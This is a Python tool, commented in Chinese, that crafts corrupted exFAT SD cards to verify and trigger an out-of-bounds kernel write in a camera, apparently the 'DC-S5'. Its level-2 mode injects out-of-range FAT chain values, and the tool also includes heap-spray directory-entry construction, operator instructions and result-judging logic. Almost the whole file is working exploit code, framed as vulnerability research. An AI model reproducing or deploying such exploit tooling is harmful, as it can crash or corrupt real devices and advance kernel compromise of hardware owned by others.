#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
exfat_patch.py — exFAT 自洽补丁工具（复刻 S1R2 报告的方法，用于 S5 漏洞验证）

用途：验证 DC-S5 是否带 S1R2 同款 exFAT 内核越界写缺陷。
      做法与 S1R2 一致：**只改 FAT 表，不动 boot / 根目录 / bitmap / 数据**，
      使卡保持 100% 自洽（相机不会要求格式化），仅在"删除文件"时让内核
      以越界簇号调用 clr_alloc_bitmap()。

两级用法：
  第 1 级（几乎零风险）：--level1  把 FAT 链尾改成【范围内的正常簇号】
                          目的：确认相机接受这类补丁卡
  第 2 级（有风险）    ：--level2  把 FAT 链尾改成【越界值】
                          目的：触发内核越界写（相机报"写入错误"即为已执行）

配套命令：
  info              解析 BPB + 校验 Boot Checksum / 校验 FAT
  bitmap            ★ 读分配位图目录项 → 算 map_sectors 与越界阈值
  go1 <dev> <簇> [目录]  ★★ 一条命令做第 1 级：存位图+打补丁+回读校验+GO/NO-GO
  go1check <dev>     ★★ 删除后比对位图并给出结论
  entries <dir>     列出某个目录下的 entry set（含 start_clu / size）
  chain <clu>       打印某文件从该簇开始的 FAT 链

依赖：需要 root 读写原始设备（例如 sudo python3 exfat_patch.py … /dev/rdisk8s1）
用法：
  sudo python3 exfat_patch.py info      /dev/rdisk8s1
  sudo python3 exfat_patch.py entries   /dev/rdisk8s1 /DCIM/100_PANA
  sudo python3 exfat_patch.py bitmap    /dev/rdisk8s1
  sudo python3 exfat_patch.py chain     /dev/rdisk8s1 1234
  sudo python3 exfat_patch.py --level1  /dev/rdisk8s1 <文件所在簇> <新链尾簇号>
  sudo python3 exfat_patch.py --level2  /dev/rdisk8s1 <文件所在簇> <越界值>
  sudo python3 exfat_patch.py restore   /dev/rdisk8s1   # 从 .bak.json 还原
"""
import json
import os
import time
import struct
import sys

SECTOR = 512
BACKUP = "/tmp/.exfat_patch_backup.json"
LAST_HIJACK = {}
STATE = "/tmp/s5_go1_state.json"


# ---------------- 校验和（exFAT 规范 / S1R2 报告一致） ----------------
def boot_checksum(boot_region: bytes) -> int:
    """exFAT Boot Checksum —— 【实测校正版】

    覆盖范围是【整个引导区 11 个扇区】（扇区 0..10，共 11*BytesPerSector 字节），
    **不是** 512 字节！跳过偏移 106、107、112（VolumeFlags 两字节 + PercentInUse）。

    本结论由 macOS 生成的 exFAT 镜像实测得出：
      仅算 512B      -> 0x4150F9FA  ❌
      算 11 扇区     -> 0x4151009E  ✅ 与卡上第 11 扇区存储值一致
    （S1R2 报告只写了"跳过 106/107/112"，未说明覆盖范围，照字面只算 512B 会算错。）"""
    ck = 0
    for i in range(len(boot_region)):
        if i in (106, 107, 112):
            continue
        ck = (((ck & 1) << 31) + (ck >> 1) + boot_region[i]) & 0xFFFFFFFF
    return ck


def entry_set_checksum(entries: bytes, n: int) -> int:
    """Entry Set Checksum：跨整个 entry set；第 1 条的 byte2/3（SetChecksum）跳过。"""
    ck = 0
    for e in range(n):
        base = e * 32
        for i in range(32):
            if e == 0 and i in (2, 3):
                continue
            ck = (((ck & 1) << 15) + (ck >> 1) + entries[base + i]) & 0xFFFF
    return ck


# ---------------- 设备读写 ----------------
class Dev:
    def __init__(self, path):
        self.path = path
        self.f = open(path, "r+b", buffering=0)
        self.sector0 = self.read(0, SECTOR)
        if self.sector0[3:11] != b"EXFAT   ":
            raise SystemExit("!! 不是 exFAT（sector0[3:11] != 'EXFAT   '）。"
                             "请让相机把 >32GB 的 SDXC 卡格式化后再来。")
        self.parse_bpb()

    def parse_bpb(self):
        s = self.sector0
        self.part_offset = struct.unpack_from("<Q", s, 64)[0]
        self.vol_length = struct.unpack_from("<Q", s, 72)[0]
        self.fat_offset = struct.unpack_from("<I", s, 80)[0]
        self.fat_length = struct.unpack_from("<I", s, 84)[0]
        self.clu_offset = struct.unpack_from("<I", s, 88)[0]
        self.clu_count = struct.unpack_from("<I", s, 92)[0]
        self.root_clu = struct.unpack_from("<I", s, 96)[0]
        self.vol_serial = struct.unpack_from("<I", s, 100)[0]
        self.bps_shift = s[108]
        self.spc_shift = s[109]
        self.num_fats = s[110]
        self.drive_sel = s[111]
        self.percent_in_use = s[112]
        self.sector_size = 1 << self.bps_shift
        self.sectors_per_clu = 1 << self.spc_shift
        self.cluster_size = self.sector_size * self.sectors_per_clu
        # BootChecksum 位于【第 11 扇区】（Boot Checksum 扇区），是重复的 32 位模式
        self.bps = 1 << self.bps_shift
        self.boot_region = self.read(0, 11 * self.bps)      # 扇区 0..10 = 引导区
        ck_sector = self.read(11 * self.bps, self.bps)
        self.stored_boot_ck = struct.unpack_from("<I", ck_sector, 0)[0]

    def seek_clu(self, clu):
        return (self.clu_offset + (clu - 2) * self.sectors_per_clu) * self.sector_size

    def seek_fat(self, clu):
        return (self.fat_offset * self.sector_size) + clu * 4

    def read(self, off, n):
        self.f.seek(off)
        return self.f.read(n)

    def write(self, off, data):
        self.f.seek(off)
        self.f.write(data)

    def fat_get(self, clu):
        return struct.unpack("<I", self.read(self.seek_fat(clu), 4))[0]

    def fat_set(self, clu, val):
        self.write(self.seek_fat(clu), struct.pack("<I", val))
        self.sync()

    def sync(self):
        """强制落盘：块设备写入可能停留在页缓存里，拔卡就会丢。"""
        try:
            self.f.flush()
        except Exception:
            pass
        try:
            os.fsync(self.f.fileno())
        except Exception:
            pass

    def close(self):
        try:
            self.sync(); self.f.close()
        except Exception:
            pass


def cmd_info(dev):
    print("== exFAT BPB ==")
    print("  VolumeLength(sectors) = %d" % dev.vol_length)
    print("  FATOffset = %d   FATLength = %d   NumberOfFats = %d"
          % (dev.fat_offset, dev.fat_length, dev.num_fats))
    print("  ClusterHeapOffset = %d   ClusterCount = %d   RootCluster = %d"
          % (dev.clu_offset, dev.clu_count, dev.root_clu))
    print("  BytesPerSector = %d   SectorsPerCluster = %d   ClusterSize = %d B"
          % (dev.sector_size, dev.sectors_per_clu, dev.cluster_size))
    print("  卡容量 ≈ %.2f GB" % (dev.vol_length * dev.sector_size / 1e9))
    print()
    print("== Boot Checksum 自检 ==")
    calc = boot_checksum(dev.boot_region)
    print("  卡上存储 = 0x%08X" % dev.stored_boot_ck)
    print("  本地计算 = 0x%08X   %s"
          % (calc, "✅ 一致（算法复刻正确）" if calc == dev.stored_boot_ck else "❌ 不一致"))
    print()
    print("== 关键结论 ==")
    if dev.clu_count == 0:
        print("  !! ClusterCount=0，异常")
    else:
        print("  map_sectors 由 bitmap 目录项的 DataLength 决定；")
        print("  越界条件：FAT 链尾给出 > ClusterCount 的簇号 → clr_alloc_bitmap() 越界索引")


def list_dir(dev, clu):
    """遍历一个目录簇链，返回 [(name, attr, start_clu, size), ...]"""
    out = []
    seen = 0
    while 2 <= clu < dev.clu_count + 2 and seen < 100000:
        data = dev.read(dev.seek_clu(clu), dev.cluster_size)
        i = 0
        while i + 32 <= len(data):
            et = data[i]
            if et == 0x00:                      # 目录结束标记
                return out
            if et == 0x85:                      # File Entry
                num_ext = data[i + 1]
                n = num_ext + 1
                if i + n * 32 > len(data):
                    return out
                st = data[i:i + n * 32]
                attr = struct.unpack_from("<H", st, 4)[0]
                name, start, size = "", 0, 0
                for e in range(1, n):
                    t = st[e * 32]
                    if t == 0xC0:               # Stream Extension
                        start = struct.unpack_from("<I", st, e * 32 + 0x14)[0]
                        size = struct.unpack_from("<Q", st, e * 32 + 0x18)[0]
                    elif t == 0xC1:             # File Name
                        # ★ 文件名从 entry 内偏移 2 开始（前 2 字节是类型 + 标志）
                        raw = st[e * 32 + 2: e * 32 + 32]
                        name += raw.decode("utf-16le", "replace")
                out.append((name.rstrip("\x00"), attr, start, size))
                i += n * 32
                continue
            i += 32
        nxt = dev.fat_get(clu)
        if nxt < 2 or nxt >= dev.clu_count + 2:
            break
        clu = nxt
        seen += 1
    return out


def cmd_entries(dev, path):
    parts = [p for p in path.replace("\\", "/").split("/") if p]
    clu = dev.root_clu
    if not parts:
        parts = []
    for k, want in enumerate(parts):
        items = list_dir(dev, clu)
        match = [x for x in items if x[0].lower() == want.lower()]
        if not match:
            print("  目录 %s 的实际内容：" % ("/" + "/".join(parts[:k]) if k else "/"))
            for nm, attr, st, sz in items:
                kind = "[DIR]" if (attr & 0x10) else "[FILE]"
                print("    %-24s attr=0x%04X start_clu=%-8d size=%-10d %s"
                      % (nm, attr, st, sz, kind))
            print("  !! 未找到: %s" % want)
            return
        nm, attr, st, sz = match[0]
        kind = "[DIR]" if (attr & 0x10) else "[FILE]"
        print("  %-24s start_clu=%-8d size=%-10d %s" % (nm, st, sz, kind))
        if attr & 0x10:
            clu = st
        else:
            print()
            cmd_chain(dev, st)
            return
    # 路径是目录：列出内容
    print("  目录内容：")
    for nm, attr, st, sz in list_dir(dev, clu):
        kind = "[DIR]" if (attr & 0x10) else "[FILE]"
        print("    %-24s attr=0x%04X start_clu=%-8d size=%-10d %s"
              % (nm, attr, st, sz, kind))


def find_dir_clu(dev, path):
    """按路径找目录的起始簇（用于自动取"注入目标"）。"""
    parts = [x for x in path.replace("\\", "/").split("/") if x]
    clu = dev.root_clu
    for want in parts:
        hit = None
        for nm, attr, st, sz in list_dir(dev, clu):
            if nm.lower() == want.lower() and (attr & 0x10):
                hit = st
        if hit is None:
            return None
        clu = hit
    return clu


def chain_tail(dev, start_clu):
    """返回 (链尾簇, 链长, 链尾原值)；不可用时链尾簇为 None。带环检测。"""
    if not isinstance(start_clu, int):
        return None, 0, None
    clu = start_clu
    n = 0
    seen = set()
    while 2 <= clu < dev.clu_count + 2 and n < 2000000:
        if clu in seen:
            return None, n, None            # 有环
        seen.add(clu)
        nxt = dev.fat_get(clu)
        if nxt >= 0xFFFFFFF8 or nxt >= dev.clu_count + 2:
            return clu, n + 1, nxt
        clu = nxt
        n += 1
    return None, n, None


def read_bitmap(dev):
    """返回 (位图字节, 起始簇, 长度)。"""
    clu = dev.root_clu
    bm = None
    while 2 <= clu < dev.clu_count + 2 and bm is None:
        data = dev.read(dev.seek_clu(clu), dev.cluster_size)
        i = 0
        while i + 32 <= len(data):
            et = data[i]
            if et == 0x00:
                break
            if et == 0x81:
                bm = (struct.unpack_from("<I", data, i + 0x14)[0],
                      struct.unpack_from("<Q", data, i + 0x18)[0])
            i += 32
        if bm:
            break
        nxt = dev.fat_get(clu)
        if nxt < 2 or nxt >= dev.clu_count + 2:
            break
        clu = nxt
    if not bm:
        return None, None, None
    start, length = bm
    buf = bytearray()
    c = start
    while len(buf) < length and 2 <= c < dev.clu_count + 2:
        buf += dev.read(dev.seek_clu(c), min(dev.cluster_size, length - len(buf)))
        nxt = dev.fat_get(c)
        if nxt < 2 or nxt >= dev.clu_count + 2:
            break
        c = nxt
    return bytes(buf), start, length


def bit_get(bm, clu):
    idx = clu - 2
    if idx < 0 or idx >> 3 >= len(bm):
        return 0
    return (bm[idx >> 3] >> (idx & 7)) & 1


def chain_set(dev, start_clu, cap=400000):
    """返回该链上的簇集合。"""
    out = set()
    clu = start_clu
    while isinstance(clu, int) and 2 <= clu < dev.clu_count + 2 and len(out) < cap:
        if clu in out:
            break
        out.add(clu)
        nxt = dev.fat_get(clu)
        if nxt >= 0xFFFFFFF8 or nxt >= dev.clu_count + 2:
            break
        clu = nxt
    return out


def pick_redirect(dev, exclude, want_allocated=True, max_cand=12):
    """自动挑一个"终止型"注入点：FAT 值 >= 0xFFFFFFF8、位图位为 1、且不在 exclude 中。
       优先目录簇（更直观）。返回 [(簇号, 说明), ...]"""
    bm, _s, _l = read_bitmap(dev)
    cands = []

    # 优先：目录簇
    for label, path in (("根目录", None), ("/DCIM", "/DCIM"), ("/DCIM/100_PANA", "/DCIM/100_PANA")):
        c = dev.root_clu if path is None else find_dir_clu(dev, path)
        if not c or c in exclude or c in [x[0] for x in cands]:
            continue
        v = dev.fat_get(c)
        if v >= 0xFFFFFFF8 or v >= dev.clu_count + 2:
            cands.append((c, "%s(终止型)" % label))
        elif bm is not None and bit_get(bm, c) == 1:
            t, n, tv = chain_tail(dev, c)
            if t is not None and tv >= 0xFFFFFFF8:
                cands.append((c, "%s(链长%d→尾%d)" % (label, n, t)))

    # 兜底：扫 FAT 找"值为 0xFFFFFFFF 且已分配"的簇
    if len(cands) < max_cand and bm is not None:
        for c in range(2, min(dev.clu_count + 2, 200000)):
            if len(cands) >= max_cand:
                break
            if c in exclude or any(c == x[0] for x in cands):
                continue
            if bit_get(bm, c) != 1:
                continue
            if dev.fat_get(c) == 0xFFFFFFFF:
                cands.append((c, "扫描命中(始终止型)"))
    return cands[:max_cand]


def cmd_go1(dev, target_clu, redirect_path):
    """一条命令完成第 1 级：自动挑目标文件 → 找链尾 → 存位图 → 打补丁 → 回读校验 → GO/NO-GO。"""
    # 每次开始都清掉旧状态，避免 go1check 拿到过期信息
    try:
        os.remove(STATE)
        print("[i] 已清除旧状态文件 %s" % STATE)
    except Exception:
        pass
    try:
        os.remove(BACKUP)          # 每次只保留本次的原始值，避免 restore 误伤旧簇
        print("[i] 已清除旧备份文件 %s" % BACKUP)
    except Exception:
        pass
    if target_clu in (None, 0):
        print("== [0/4] 自动挑选目标文件（/DCIM/100_PANA 下第一个 JPG）==")
        dclu = find_dir_clu(dev, "/DCIM/100_PANA")
        if dclu is None:
            print("  !! 找不到 /DCIM/100_PANA（相机还没拍照片？）"); return 2
        # 排除堆喷文件（AAAA 长名版 / P9000xxx 短名版），只挑相机写的正常照片
        def _is_spray(n):
            u = n.upper()
            return ("AAAA" in u) or u.startswith("P9000")
        jpgs = [(nm, st) for nm, attr, st, sz in list_dir(dev, dclu)
                if nm.upper().endswith(".JPG") and not _is_spray(nm)]
        if not jpgs:
            print("  !! 该目录里没有 JPG —— 请先用相机拍几张照片"); return 2
        for nm, st in jpgs:
            print("     候选: %-20s start_clu=%d" % (nm, st))
        nm, target_clu = jpgs[0]
        print("  → 选中 %s (start_clu=%d)" % (nm, target_clu))
        print()
    print("== [1/4] 找要删文件的链尾 ==")
    tail, n, old = chain_tail(dev, target_clu)
    if tail is None:
        print("  !! 起始簇 %d 的链无效" % target_clu); return 2
    print("  起始簇 %d  链长 %d  链尾簇 %d  链尾原值 0x%08X" % (target_clu, n, tail, old))
    print()
    print("== [2/4] 自动挑选注入点 ==")
    excl = chain_set(dev, target_clu)
    print("  被删文件占用 %d 个簇（已排除）" % len(excl))
    cands = pick_redirect(dev, excl)
    if not cands:
        print("  !! 找不到合适的、终止型且已分配的注入点")
        d0 = find_dir_clu(dev, "/DCIM/100_PANA")
        print("  （诊断）100_PANA 起始簇=%s  FAT值=0x%08X" % (d0, dev.fat_get(d0) if d0 else -1))
        return 2
    for c, why in cands:
        print("     候选注入点: 簇 %-7d  FAT值=0x%08X   %s" % (c, dev.fat_get(c), why))
    dclu = cands[0][0]
    print("  → 选中簇 %d（%s）" % (dclu, cands[0][1]))
    print("  → 将把 FAT[%d] 从 0x%08X 改成 %d" % (tail, old, dclu))
    print()
    print("== [3/4] 存删除前位图 + 打补丁 ==")
    cmd_dumpbitmap(dev, "/tmp/bm_before.bin")
    bak = {}
    if os.path.exists(BACKUP):
        try: bak = json.load(open(BACKUP))
        except Exception: bak = {}
    bak[str(tail)] = old
    json.dump(bak, open(BACKUP, "w"))
    dev.fat_set(tail, dclu)
    print()
    print("== [4/4] 回读校验（强制落盘 + 重新打开设备独立复核）==")
    chain_now = sorted(chain_set(dev, target_clu))     # ← 必须在关闭前算
    dev.sync()
    got1 = dev.fat_get(tail)
    dev.close()
    dev2 = Dev(dev.path)
    got2 = dev2.fat_get(tail)
    dev2.close()
    print("  同 fd 回读   FAT[%d] = 0x%08X (%d)" % (tail, got1, got1))
    print("  重开设备回读 FAT[%d] = 0x%08X (%d)" % (tail, got2, got2))
    got = got2
    if got == dclu:
        print()
        try:
            json.dump({"tail": tail, "old": old, "injected": dclu,
                       "target_start": target_clu, "chain_len": n,
                       "chain": chain_now,
                       "ts": time.strftime("%F %T")}, open(STATE, "w"))
        except Exception as e:
            print("  !! 状态文件写入失败: %s" % e)
            print("  ❌ NO-GO：无从裁决，请不要去相机！")
            return 2
        print("  ★★★★★ 补丁已确认写入（原值已备份到 %s）★★★★★" % BACKUP)
        print("  ✅ GO：现在可以拔卡插进相机了")
        print("     1) 开机，确认卡正常识别、照片能显示")
        print("     2) 删除起始簇 = %d 的那个文件" % target_clu)
        print("     3) 关机拔卡，插回 Mac")
        print("     4) 跑:  sudo bash /tmp/s5exfat/s5_exfat_test.sh go1check /dev/disk8s1")
        return 0
    else:
        print()
        print("  ❌ NO-GO：回读值与预期不符，补丁未生效 —— 请不要去相机！")
        return 2


def cmd_go2(dev, target_clu, oob_value):
    """第 2 级：把被删文件的链尾指向【越界值】，触发内核越界索引 vol_amap[i]。"""
    try:
        os.remove(STATE); os.remove(BACKUP)
    except Exception:
        pass
    if target_clu in (None, 0):
        dclu = find_dir_clu(dev, "/DCIM/100_PANA")
        if dclu is None:
            print("!! 找不到 /DCIM/100_PANA"); return 2
        def _is_spray(n):
            u = n.upper()
            return ("AAAA" in u) or u.startswith("P9000")
        jpgs = [(nm, st) for nm, attr, st, sz in list_dir(dev, dclu)
                if nm.upper().endswith(".JPG") and not _is_spray(nm)]
        if not jpgs:
            print("!! 目录里没有 JPG —— 请先拍照"); return 2
        for nm, st in jpgs:
            print("   候选: %-16s start_clu=%d" % (nm, st))
        nm, target_clu = jpgs[0]
        print("   → 选中 %s (start_clu=%d)" % (nm, target_clu))
    tail, n, old = chain_tail(dev, target_clu)
    if tail is None:
        print("!! 无法解析链"); return 2
    map_sectors = ((61036 - 1) >> dev.bps_shift) + 1
    idx = (oob_value - 2) >> (dev.bps_shift + 3)
    print()
    print("################ 第 2 级：越界注入 ################")
    print("  被删文件起始簇 = %d   链长 = %d   链尾簇 = %d（原值 0x%08X）"
          % (target_clu, n, tail, old))
    print("  注入值 = %d  →  内核索引 i = (%d-2)>>12 = %d" % (oob_value, oob_value, idx))
    print("  map_sectors = %d" % map_sectors)
    if idx < map_sectors:
        print("  !! 该值未越界（i < map_sectors），不会触发 OOB"); return 2
    print("  ⚠️ i >= map_sectors ⇒ 越界读 vol_amap[%d]。" % idx)
    if idx <= (map_sectors // 8 + 1) * 8 - 1 + map_sectors - 1 and idx < map_sectors + 8:
        print("  ⚠️⚠️ 该索引落在 kmalloc slab 填充区（%d..%d）—— 极可能是 NULL，会内核 Oops！"
              % (map_sectors, map_sectors + 7))
    print("  ⚠️ 风险：目标槽内容未知。若为 NULL → 内核崩溃，相机可能需拔电池。")
    print("  ⚠️ 请确认使用的是【牺牲卡】，并做好相机断电重启的准备。")
    print()
    cmd_dumpbitmap(dev, "/tmp/bm_before.bin")
    json.dump({str(tail): old}, open(BACKUP, "w"))
    dev.fat_set(tail, oob_value)
    chain_now = sorted(chain_set(dev, target_clu)) if (oob_value - 2) >> 12 < dev.clu_count + 2 else []
    dev.sync()
    got1 = dev.fat_get(tail)
    dev.close()
    d2 = Dev(dev.path); got2 = d2.fat_get(tail); d2.close()
    print()
    print("== 回读校验 ==")
    print("  同 fd     FAT[%d] = 0x%08X (%d)" % (tail, got1, got1))
    print("  重开设备  FAT[%d] = 0x%08X (%d)" % (tail, got2, got2))
    if got2 != oob_value:
        print("  ❌ NO-GO：写入失败，不要去相机！"); return 2
    json.dump({"tail": tail, "old": old, "injected": oob_value, "target_start": target_clu,
               "chain_len": n, "chain": [c for c in chain_now if c < dev.clu_count + 2],
               "mode": "L2", "ts": time.strftime("%F %T")}, open(STATE, "w"))
    print()
    print("  ★★★★★ 越界注入已确认写入卡中 ★★★★★")
    print("  ✅ GO：现在拔卡插进相机，【删除起始簇 = %d 的那张 JPG】" % target_clu)
    print()
    print("  删除后请观察相机屏幕：")
    print("    · 报『写入错误 请检查卡』 ⇒ 卡写失败，而 clr_alloc_bitmap() 是")
    print("      【先内存写、后卡写】⇒ 内核内存位清除【已经执行】⇒ 越界写成立")
    print("    · 相机死机/黑屏            ⇒ 命中了无效槽位（拔电池重启）")
    print("    · 正常删除无报错          ⇒ 该槽可能被容错，或未走到越界路径")
    print()
    print("  记录完现象后，回来跑:  sudo bash /tmp/s5exfat/s5_exfat_test.sh verdict /dev/disk8s1")
    return 0


def cmd_verdict(dev):
    """一站式诊断：结构 + 位图 + 与删除前基线比对 + 簇5状态 → 直接给结论。"""
    print("############ 一站式诊断 ############")
    cmd_info(dev)
    print()
    print("== 根目录 ==")
    for nm, attr, st, sz in list_dir(dev, dev.root_clu):
        print("   %-20s attr=0x%04X start_clu=%-8d %s" % (nm, attr, st, "DIR" if attr & 0x10 else "FILE"))
    for path in ("/DCIM", "/DCIM/100_PANA"):
        cl = find_dir_clu(dev, path)
        print()
        print("== %s (start_clu=%s) ==" % (path, cl))
        if cl is None:
            print("   !! 不存在或不可读")
            continue
        items = list_dir(dev, cl)
        if not items:
            print("   （空）")
        for nm, attr, st, sz in items:
            print("   %-20s attr=0x%04X start_clu=%-8d size=%-10d" % (nm, attr, st, sz))
    print()
    print("== 导出当前位图 ==")
    cmd_dumpbitmap(dev, "/tmp/bm_now.bin")
    print()
    print("=========== 位图比对（baseline=/tmp/bm_before.bin）===========")
    # 卡代次守卫：指纹不一致 -> 直接拒绝裁决
    try:
        m1 = json.load(open("/tmp/bm_before.bin.meta.json"))
        m2 = json.load(open("/tmp/bm_now.bin.meta.json"))
        if m1.get("boot_ck") != m2.get("boot_ck") or m1.get("cluster_count") != m2.get("cluster_count"):
            print("  !! 卡代次已变化，比对无效：")
            print("     baseline: boot_ck=0x%08X cc=%s (%s)"
                  % (m1.get("boot_ck", 0), m1.get("cluster_count"), m1.get("ts")))
            print("     now     : boot_ck=0x%08X cc=%s (%s)"
                  % (m2.get("boot_ck", 0), m2.get("cluster_count"), m2.get("ts")))
            print("     ⇒ 期间卡被重新格式化/重建过。请重做一次干净的 session。")
            return 1
    except Exception as e:
        print("  (指纹文件缺失，跳过守卫: %s)" % e)
    try:
        b = open("/tmp/bm_before.bin", "rb").read()
        a = open("/tmp/bm_now.bin", "rb").read()
    except Exception as e:
        print("  无法比对: %s" % e); return 1
    if len(b) != len(a):
        print("  长度不同（%d vs %d）—— 卡被重建过" % (len(b), len(a))); return 1
    freed = [i + 2 for i in range(len(b) * 8)
             if ((b[i >> 3] >> (i & 7)) & 1) == 1 and ((a[i >> 3] >> (i & 7)) & 1) == 0]
    alloc_new = [i + 2 for i in range(len(b) * 8)
                 if ((b[i >> 3] >> (i & 7)) & 1) == 0 and ((a[i >> 3] >> (i & 7)) & 1) == 1]
    print("  删除前已分配 = %d 簇 ; 现在已分配 = %d 簇"
          % (sum(bin(x).count("1") for x in b), sum(bin(x).count("1") for x in a)))
    print("  被释放 %d 簇 ; 新分配 %d 簇" % (len(freed), len(alloc_new)))
    for tag, lst in (("被释放", freed), ("新分配", alloc_new)):
        if not lst:
            continue
        rng = []; s0 = p0 = lst[0]
        for x in lst[1:]:
            if x == p0 + 1: p0 = x; continue
            rng.append((s0, p0)); s0 = p0 = x
        rng.append((s0, p0))
        print("  %s区间:" % tag)
        for s1, e1 in rng[:25]:
            mark = ""
            if s1 <= 5 <= e1: mark = "   ★★★ 含簇 5（DCIM 目录）★★★"
            if s1 <= 6 <= e1: mark = "   ★ 含簇 6（PRIVATE 目录）"
            print("     %7d – %-7d (%d 个)%s" % (s1, e1, e1 - s1 + 1, mark))
    print()
    print("================= 最终判读 =================")
    five = 5 in freed
    six = 6 in freed
    print("  簇 5  (DCIM 目录) 是否被释放 : %s" % ("是" if five else "否"))
    print("  簇 6  (PRIVATE 目录) 是否被释放 : %s" % ("是" if six else "否"))
    if five:
        print()
        print("  ★★ 结论：内核在删除文件时【跟着卡上被篡改的 FAT 链跳转】，")
        print("     把注入的目录簇 5 也释放了 —— 释放路径完全受卡上 FAT 值控制。")
        print("     ⇒ 与 S1R2 同族的 exFAT 越界写前置条件【在 S5 上成立】。")
    else:
        print()
        print("  ×  结论：注入的目录簇未被释放 —— 尚不能认定内核跟随注入值。")
    print("===========================================")
    return 0


def cmd_go1check(dev):
    """删除后：自动比对并给出【明确裁决】（依赖 go1 写的状态文件）。"""
    if not os.path.exists(STATE):
        print("!! 没有找到 %s" % STATE)
        print("   说明本次没有成功执行过 go1 —— 无法裁决，请不要采信本次结果。")
        return 2
    st = json.load(open(STATE))
    cmd_dumpbitmap(dev, "/tmp/bm_after.bin")
    b = open("/tmp/bm_before.bin", "rb").read()
    a = open("/tmp/bm_after.bin", "rb").read()
    if len(b) != len(a):
        print("!! 两次位图长度不同：卡被重建/格式化过"); return 2
    freed = [i + 2 for i in range(len(b) * 8)
             if ((b[i >> 3] >> (i & 7)) & 1) == 1 and ((a[i >> 3] >> (i & 7)) & 1) == 0]
    freed_set = set(freed)
    own = set(st["chain"]) - {st["injected"]}     # ← 排除注入值，否则结局会被掩盖
    extra = sorted(freed_set - own)
    print()
    print("=================== 裁  决 ===================")
    print("  注入信息 (go1 记录):")
    print("    被删文件起始簇 = %s   自身链长 = %s" % (st["target_start"], st["chain_len"]))
    print("    把 FAT[%s] 从 0x%08X 改成 %s" % (st["tail"], st["old"], st["injected"]))
    print()
    print("  实际被释放簇数 = %d" % len(freed))
    print("  其中【属于被删文件自身链】= %d" % len(freed_set & own))
    print("  其中【不属于自身链】= %d" % len(extra))
    if extra:
        rng = []; s0 = p0 = extra[0]
        for x in extra[1:]:
            if x == p0 + 1: p0 = x; continue
            rng.append((s0, p0)); s0 = p0 = x
        rng.append((s0, p0))
        print("    额外释放区间:")
        for s1, e1 in rng[:20]:
            mark = "  ★含注入目标 %s" % st["injected"] if s1 <= st["injected"] <= e1 else ""
            print("       %7d – %-7d (%d 个)%s" % (s1, e1, e1 - s1 + 1, mark))
    print()
    if st["injected"] in freed_set:
        print("  ★★ 结论: 内核【跟着注入的簇号跳转并释放了它】")
        print("     注入簇 %s 不属于被删文件的自身链，却被释放 ⇒ 释放路径完全受卡控制" % st["injected"])
        print("      ⇒ 释放路径完全受卡上 FAT 值控制 —— 攻击链【成立】")
    elif extra:
        print("  ★ 结论: 出现了【自身链之外】的释放，但注入目标 %s 不在其中。" % st["injected"])
        print("     可能是相机按连续分配释放，或链路后续跳转落在别处。需再判读。")
    else:
        print("  ×  结论: 只释放了被删文件自身链 —— 内核【没有】跟注入值走。")
    print("==============================================")
    return 0




# ============ 直接构造 exFAT 目录项（用于堆喷：短名字 + 被篡改的 num_ext） ============

def name_hash(name):
    """exFAT 名字哈希（ASCII 大写/数字/点 时 upcase 为恒等）"""
    h = 0
    for ch in name:
        h = (((h << 15) | (h >> 1)) + ord(ch)) & 0xFFFF
    return h


def set_checksum(entry_set):
    """exFAT entry set 校验和：跳过前 2 字节之后的 byte2/byte3"""
    ck = 0
    for i, b in enumerate(entry_set):
        if i == 2 or i == 3:
            continue
        ck = (((ck << 15) | (ck >> 1)) + b) & 0xFFFF
    return ck


def build_entry_set(name, num_ext, first_cluster, data_len):
    """构造一个 entry set：File(0x85) + Stream(0xC0) + Name(0xC1) + 填充 0xE0"""
    n_name = (len(name) + 14) // 15
    need = 1 + 1 + n_name                      # File + Stream + Name
    if num_ext + 1 < need:
        raise ValueError("num_ext 太小")
    buf = bytearray((num_ext + 1) * 32)
    # --- File Entry (0x85) ---
    buf[0] = 0x85
    buf[1] = num_ext
    struct.pack_into("<H", buf, 4, 0x20)       # attributes = archive
    struct.pack_into("<H", buf, 8, 0)          # create time
    struct.pack_into("<H", buf, 10, 0x50A1)    # create date
    struct.pack_into("<H", buf, 12, 0)         # mod time
    struct.pack_into("<H", buf, 14, 0x50A1)
    struct.pack_into("<H", buf, 16, 0)
    struct.pack_into("<H", buf, 18, 0x50A1)
    # --- Stream Extension (0xC0) ---
    o = 32
    buf[o] = 0xC0
    buf[o + 1] = 0x01                          # allocation possible
    buf[o + 3] = len(name)                     # name length (chars)
    struct.pack_into("<H", buf, o + 4, name_hash(name))
    struct.pack_into("<Q", buf, o + 8, data_len)
    struct.pack_into("<I", buf, o + 20, first_cluster)
    struct.pack_into("<Q", buf, o + 24, data_len)
    # --- File Name (0xC1) ---
    o = 64
    u = name.encode("utf-16le")
    for k in range(n_name):
        buf[o + k * 32] = 0xC1
        chunk = u[k * 30:(k + 1) * 30]
        buf[o + k * 32 + 2: o + k * 32 + 2 + len(chunk)] = chunk
    # --- 填充：Vendor Extension (0xE0) ---
    for k in range(need, num_ext + 1):
        buf[k * 32] = 0xE0
    # --- 校验和 ---
    struct.pack_into("<H", buf, 2, set_checksum(bytes(buf)))
    return bytes(buf)


def alloc_one_cluster(dev):
    """★ 安全版：找一个真正空闲的簇。
       除位图外，还额外检查 FAT[clu]==0，并跳过任何已出现在目录链上的簇。
       —— 之前只信位图，导致误分配了照片占用的簇，把卡写坏了。"""
    bm, start, length = read_bitmap(dev)
    if bm is None:
        print("  !! 读不到分配位图，拒绝分配"); return None
    # 收集目录链上已占用的簇，作为额外排除集
    taken = set()
    try:
        dclu = find_dir_clu(dev, "/DCIM/100_PANA")
        c = dclu
        while 2 <= c < dev.clu_count + 2 and len(taken) < 200000:
            taken.add(c)
            nxt = dev.fat_get(c)
            if nxt >= 0xFFFFFFF8 or nxt >= dev.clu_count + 2:
                break
            c = nxt
    except Exception:
        pass
    for i in range(length * 8):
        clu = i + 2
        if clu >= dev.clu_count + 2:
            break
        if ((bm[i >> 3] >> (i & 7)) & 1) != 0:
            continue                      # 位图说已占用
        if clu in taken:
            continue                      # 目录链占用
        fatv = dev.fat_get(clu)
        if fatv != 0:
            continue                      # ★ FAT 非 0 ⇒ 其实在用（位图不可信时的兜底）
        b = bytearray(bm)
        b[i >> 3] |= (1 << (i & 7))
        dev.write(dev.seek_clu(start), bytes(b[:dev.cluster_size]))
        dev.fat_set(clu, 0xFFFFFFFF)
        return clu
    return None


def cmd_checkalloc(dev):
